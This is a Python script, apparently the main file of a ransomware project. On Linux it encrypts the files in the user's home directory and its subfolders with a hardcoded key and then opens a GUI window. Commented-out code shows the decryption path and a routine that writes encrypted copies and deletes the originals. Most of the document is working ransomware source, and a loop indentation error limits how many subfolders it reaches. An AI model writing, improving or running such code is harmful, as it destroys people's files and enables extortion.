#!/usr/bin/env python3

# Importing the necessary modules
import platform
import os
from modules.encryptLinux import Encryption
from gui.encryptionGui import EncryptionWindow


# Setting the key 
key = b"mt-xCN__QEtDK9SKToML_BOashTMvR7m04x3TmU14VI="

# Creating an instance of the encryptor object
linuxEncryptor = Encryption(key=key)

# Creating an instance of the encryption window class
GuiEncryptionWindow = EncryptionWindow(linuxEncryptor)


# Checking for windows operating system
if platform.system() == "Windows":
    print("[INFO] Detected Windows OS")

    # Navigate into the home directory
    os.chdir(os.path.expanduser("~"))


# Checking for linux operating system
elif platform.system() == "Linux":
    # Linux System detected
    print("[INFO] Detected Linux OS")

    # Navigate into the home directory
    os.chdir(os.path.expanduser("~"))

    # Encrypting the files
    linuxEncryptor.encryptFilesInDirectory(os.getcwd())
    
    # Change to each directory in the current directory and encrypt files
    for entry in os.listdir(os.getcwd()):
        entryPath = os.path.join(os.getcwd(), entry)
    
    # Check if the entry is a directory
    if os.path.isdir(entryPath):
        os.chdir(entryPath)
        linuxEncryptor.encryptFilesInDirectory(os.getcwd())
        os.chdir("..")

    # Displaying the gui 
    GuiEncryptionWindow.loadWindow()


# Checking for macOS
elif platform.system() == "Darwin":
    print("[INFO] Detected macOS")

# Else not found
else:
    print("[WARNING] Unknown operating system")


















# # Navigate into the home directory 
# os.chdir(os.path.expanduser("~"))

# # Decrypting the files
# linuxEncryptor.decryptFilesInDirectory(os.getcwd())

# # Change to each directory in the current directory and decrypt the files
# for entry in os.listdir(os.getcwd()):
#     entryPath = os.path.join(os.getcwd(), entry)

# # Check if the entry is a directory
# if os.path.isdir(entryPath):
#     os.chdir(entryPath)

#     # Decrypt the files
#     linuxEncryptor.decryptFilesInDirectory(os.getcwd())

#     # Change directory
#     os.chdir("..")


# #  Loading the key
# def loadKey():
#     # Loads the key from the current directory
#     keyName = "key.key"

#     # Open the key
#     with open(keyName, "rb") as keyFile:
#         keyContents = keyFile.read()

#     # Returning the key content
#     return keyContents


# # load the key
# key = loadKey()


# list all the files names
# for files in os.listdir(directoryPath):
#     # Create the complete file path
#     filePath = os.path.join(directoryPath, files)

#     # Checking if the file is a regular file and not a directory
#     if os.path.isfile(filePath):
#         with open(filePath, "rb") as file:
#             fileData = file.read()

#         # Encrypt the data
#         encryptedData = f.encrypt(fileData)

#         # Encoded file name
#         encodedFileName = filePath + ".enc"

#         # Write the encrypted data back to the file
#         with open(encodedFileName, "wb") as file:
#             file.write(encryptedData)

#         # Delete the original file
#         os.remove(filePath)
